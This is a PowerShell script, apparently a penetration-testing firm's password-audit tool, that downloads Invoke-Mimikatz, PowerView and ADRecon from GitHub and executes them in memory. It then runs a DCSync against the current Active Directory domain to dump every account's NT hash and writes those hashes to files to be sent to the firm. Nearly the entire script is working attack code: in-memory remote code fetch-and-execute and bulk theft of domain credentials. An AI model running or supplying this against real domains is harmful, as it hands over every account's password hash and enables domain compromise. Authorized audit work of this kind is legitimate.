# Author: LRVT - https://github.com/l4rm4nd/

# variables
$DATE = $(get-date -f yyyyMMddThhmm)
$PATH = "C:\temp\" + $DATE + "_" + "DCSYNC" + "\"
$EXT = ".txt"
$LOGFILE = $PATH + $DATE + "_" + "DCSync_NTLM_LOGFILE" + $EXT
$HASHES = $PATH + $DATE + "_" + "DCSync_NTLM_Hashes_FINAL" + $EXT
$USERS = $PATH + $DATE + "_" + "DCSync_NTLM_Users_FINAL" + $EXT
$PTFHASHES = $PATH + $DATE + "_" + "DCSync_NTLM_PTF_Hashes_FINAL" + $EXT
$IMPORTFILE = $PATH + $DATE + "_" + "DCSync_NTLM_CUSTOMER_Importfile_FINAL" + $EXT

# helper function to convert user account control values
Function DecodeUserAccountControl ([int]$UAC)
{
$UACPropertyFlags = @(
"SCRIPT",
"ACCOUNTDISABLE",
"RESERVED",
"HOMEDIR_REQUIRED",
"LOCKOUT",
"PASSWD_NOTREQD",
"PASSWD_CANT_CHANGE",
"ENCRYPTED_TEXT_PWD_ALLOWED",
"TEMP_DUPLICATE_ACCOUNT",
"NORMAL_ACCOUNT",
"RESERVED",
"INTERDOMAIN_TRUST_ACCOUNT",
"WORKSTATION_TRUST_ACCOUNT",
"SERVER_TRUST_ACCOUNT",
"RESERVED",
"RESERVED",
"DONT_EXPIRE_PASSWORD",
"MNS_LOGON_ACCOUNT",
"SMARTCARD_REQUIRED",
"TRUSTED_FOR_DELEGATION",
"NOT_DELEGATED",
"USE_DES_KEY_ONLY",
"DONT_REQ_PREAUTH",
"PASSWORD_EXPIRED",
"TRUSTED_TO_AUTH_FOR_DELEGATION",
"RESERVED",
"PARTIAL_SECRETS_ACCOUNT"
"RESERVED"
"RESERVED"
"RESERVED"
"RESERVED"
"RESERVED"
)
return (0..($UACPropertyFlags.Length) | ?{$UAC -bAnd [math]::Pow(2,$_)} | %{$UACPropertyFlags[$_]}) -join ";"
}

# download mimikatz into memory
Write-Host "[INFO] Downloading Mimikatz into Memory" -ForegroundColor Gray
iex(new-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/pentestfactory/nishang/master/Gather/Invoke-Mimikatz.ps1')

# download powerview into memory
Write-Host "[INFO] Downloading PowerView into Memory" -ForegroundColor Gray
iex(new-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/pentestfactory/PowerSploit/dev/Recon/PowerView.ps1')

# download adrecon into memory
Write-Host "[INFO] Downloading ADRecon into Memory" -ForegroundColor Gray
iex(new-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/pentestfactory/ADRecon/master/ADRecon.ps1')

# print out domain context
$domain = get-netdomain | Select-Object -property Name | foreach { $_.Name}
Write-Host "[INFO] DCSync will be executed for the domain: $domain" -ForegroundColor Red

$confirmation = Read-Host "Is the domain correct to execute DCSync on? (y/n)"
if ($confirmation -eq 'y') {

    # create directory for storage
    Write-Host ""
    Write-Host "[~] Creating new directory at $PATH" -ForegroundColor Gray
    Write-Host ""
    New-Item -ItemType Directory -Force -Path $PATH | Out-Null
    
    # execute DCSync to export NT-Hashes
    Write-Host "[!] Exporting NT-Hashes via DCSync - this may take a while..." -ForegroundColor Yellow
    $command = '"log ' + $LOGFILE + '" "lsadump::dcsync /domain:'+ $domain +' /all /csv"'
    Invoke-Mimikatz -Command $command | Out-Null

    # using ADRecon to extract user details
    Write-Host "[!] Extracting user details via LDAP" -ForegroundColor Yellow
    Invoke-ADRecon -method LDAP -Collect Users -OutputType CSV -ADROutputDir $PATH | Out-Null

    # create temporary NTLM only and users only files
    (Get-Content -LiteralPath $LOGFILE) -notmatch '\$' | ForEach-Object {$_.Split("`t")[2]} > $HASHES
    (Get-Content -LiteralPath $LOGFILE) -notmatch '\$' | ForEach-Object {$_.Split("`t")[1]} > $USERS

    # create hashfile for pentest factory and convert user account attributes
    Write-Host ""
    Write-Host "[~] Create file with hashes only" -ForegroundColor Gray
    $csv_obj = (Import-csv -Delimiter "`t" -Path $LOGFILE -header ID,SAMACCOUNTNAME,HASH,TYPE) -notmatch '\[DC\]' -notmatch '\[rpc\]' -notmatch "mimikatz\(powershell\)" -notmatch "for logfile : OK" -notmatch '\$'
    foreach ($row in $csv_obj){ $row.type=DecodeUserAccountControl $row.type}
    $csv_obj | select -Property hash,type | ConvertTo-Csv -NoTypeInformation | Select-Object -skip 1 > $PTFHASHES 

    # create import file for customer
    Write-Host "[~] Create import file with samaccountnames and hashes" -ForegroundColor Gray
    $File1 = Get-Content $USERS
    $File2 = Get-Content $HASHES
    for($i = 0; $i -lt $File1.Count; $i++)
    {
        ('{0},{1}' -f $File1[$i],$File2[$i]) |Add-Content $IMPORTFILE
    }

    # sort files into dirs
    New-Item -Path $PATH\PTF -ItemType Directory | Out-Null
    New-Item -Path $PATH\CUSTOMER -ItemType Directory | Out-Null
    Move-Item -Path $PATH\CSV-Files\Users.csv -Destination $PATH\PTF\.
    Move-Item -Path $PTFHASHES -Destination $PATH\PTF\.
    Move-Item -Path $IMPORTFILE -Destination $PATH\CUSTOMER\.
    Move-Item -Path $LOGFILE -Destination $PATH\CUSTOMER\.
   
    # cleanup
    Remove-Item -Path $USERS
    Remove-Item -Path $HASHES
    Remove-Item -Path $PATH\CSV-Files\ -recurse

    # final message
    Write-Host ""
    Write-Host "[OK] Extraction completed for" $csv_obj.length "user accounts" -ForegroundColor Green
    Write-Host "  > Please submit the 'PTF' directory to Pentest Factory GmbH" -ForegroundColor Gray
    Write-Host "  > Please consider all files as confidential!" -ForegroundColor Gray
    Write-Host ""
    explorer $PATH

}else{
    Write-Host "[!] Script aborted due to wrong domain. Please hardcode the domain in the PS1 script (line 66)." -ForegroundColor Red
}
